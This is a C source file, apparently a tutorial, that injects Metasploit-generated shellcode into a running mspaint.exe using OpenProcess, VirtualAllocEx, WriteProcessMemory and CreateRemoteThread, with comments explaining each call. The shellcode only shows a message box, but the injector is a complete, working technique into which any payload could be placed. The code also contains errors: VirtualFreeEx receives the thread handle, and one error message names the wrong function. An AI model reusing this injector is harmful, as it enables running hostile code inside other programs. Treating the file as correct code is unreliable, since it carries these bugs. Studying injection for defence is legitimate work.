#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h> // for CreateToolhelp32Snapshot and Process32First

int main(int argc, char **argv)
{
  // Thanks metasploit for generating this shellcode
  unsigned char shellCode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
                              "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
                              "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
                              "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
                              "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
                              "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
                              "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
                              "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
                              "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
                              "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                              "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                              "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
                              "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
                              "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
                              "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
                              "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
                              "\x8d\x8d\x3a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
                              "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
                              "\x00\x3e\x4c\x8d\x85\x28\x01\x00\x00\x48\x31\xc9\x41\xba"
                              "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
                              "\x56\xff\xd5\x54\x68\x69\x73\x20\x69\x73\x20\x70\x72\x6f"
                              "\x63\x65\x73\x73\x20\x69\x6e\x6a\x65\x63\x74\x69\x6f\x6e"
                              "\x00\x50\x72\x6f\x63\x65\x73\x73\x20\x49\x6e\x6a\x65\x63"
                              "\x74\x69\x6f\x6e\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c"
                              "\x6c\x00"; // Shellcode says "This is program injection!"

  PROCESSENTRY32 pe32;

  /*
    We define a PROCESSENTRY32 struct which'll store info related to each process in the snapshot.

    Think of a snapshot like a screenshot of all running process on the system, and we loop through it until we find a process with the name we want.
  */

  pe32.dwSize = sizeof(PROCESSENTRY32);

  /* Then we set the size member to the size of the whole struct, this is calculated by adding the size of each member.

  Think of a struct with 3 DWORDS and 1 unsigned char array with the size of 28. We take 4*3 (since a DWORD is 4 bytes, and we have 3 of them) + 28, so we get a size of 40 bytes.

  Remember, a struct is just a data type that stores multiple data types
  */
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  /*
    Next, we have the CreateToolhelp32Snapshot API, this takes in 2 parameters:

    1. The portions of the system to be included in the snapshot, since we want to include all running processes, we use TH32CS_SNAPPROCESS

    2. The process ID of the process to be included, in our case, we set it to 0 to indicate the current process. You can also use TH32CS_SNAPHEAPLIST, TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32, or TH32CS_SNAPALL.
  */

  Process32First(snapshot, &pe32);

  /*
    In order to enumerate the process using the Snapshot, we use 2 APIs, Process32First and Process32Next, you can only use Process32Next after Process32First. They both take in 2 parameters:

    1. The processes snapshot

    2. A reference/pointer to PROCESSENTRY32 struct.

    In a Do-While loop, enumerate all processes using Process32Next
  */

  do
  {
    if (wcscmp(pe32.szExeFile, L"mspaint.exe") == 0) // what do you mean "cannot conver 'CHAR*' {aka 'char*'} to 'const whcar_t*'? you we're working just yesterday! - added 26/06/2024
    {
      /*
      Here, we're comparing the executable file name with "mspaint.exe". wcscmp compares 2 wide strings together, and if they match, the return value is 0.

      Windows uses UTF-16 encoding, which means each character takes up 16 bits, or 2 bytes in memory. For example, if we want to encode the string "Malware" using UTF-16, it'll be represented like this:

         M      A       L      W      A      R      E
         4D 00  41 00   4C 00  57 00  41 00  52 00  45 00

      Notice each character is sepereated by a Null-Byte. Except they aren't. Since each character takes up 2 bytes, we have to pad the remaining byte with 00. Also, the string ends in a Null-Byte to indicate the end of the string. When stored in memory, it'll look like "M.A.L.W.A.R.E", each dot indicating the Null-Byte

      Since "szExeFile" is a wide string, it can't be compared with a normal string, "mspaint.exe", so we prefix it with an uppercase L to tell the compiler to treat it as a wide string before we compare it.
      */
      HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
      /*
        In order to get a handle to the process that we want to inject into, we use the OpenProcess API, this API takes 3 Parameters:

        1. The desired access to process object, or the access rights we want to have over the process. Since we want to have full access to the process resources, we use the PROCESS_ALL_ACCESS flag

        2. A boolean value, if set to TRUE, processes created by this process will inherit the handle, otherwise, processes created by this process will not inherit the handle

        3. The process ID of the process we want to access, this is the most important one. The process ID can be found by using a tool like Process Hacker and grabbing the process ID from there. This is what'll be done each time we open a process we want to inject into. Since the OS assigns a different ID to the program each time it's executed, we will take a snapshot of all running processes.
      */
      LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

      /*
        We use VirtualAllocEx to allocate a memory page inside the memory space of mspaint.

        VirtualAllocEx extends the functionality of VirtualAlloc so we can allocate memory inside memory space of another process. It takes the same parameters as VirtualAlloc, the only difference is that the first parameter is the handle to the process in which we want to allocate memory.
      */

      if (allocated_mem == NULL)
      {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        return 1;
      }

      printf("Memory page allocated at: %p\n", allocated_mem);

      WriteProcessMemory(hProcess, allocated_mem, shellCode, sizeof(shellCode), NULL);

      /*
        After we've allocated memory, we use WriteProcessMemory to write the shellcode into the allocated memory page. It takes in 5 parameters:

        1. The handle to the process we want to inject into

        2. A desination to write to

        3. A source to read or copy from

        4. The size of the copied data

        4. The number of bytes read if the function succeeds, but we don't care so we'll set it to NULL
      */

      HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

      /*
      Finally we make a thread to inject the shellcode using CreateRemoteThread. It takes in the same parameters as CreateThread in addtion to the handle to the process in which we want to inject into.
      */

      if (hThread == NULL)
      {
        printf("WriteProcessMemory failed: %d\n", GetLastError());
        return 1;
      }

      WaitForSingleObject(hThread, INFINITE); // Waiting for the thread to finish executing the shellcode

      VirtualFreeEx(hThread, allocated_mem, 0, MEM_RELEASE); // Freeing the allocated memory

      CloseHandle(hThread);
      CloseHandle(hProcess); // Closing the handles to the process and the thread
      break;                 // Breaking out of the Do-While loop
    }
  } while (Process32Next(snapshot, &pe32));

  return 0;
}
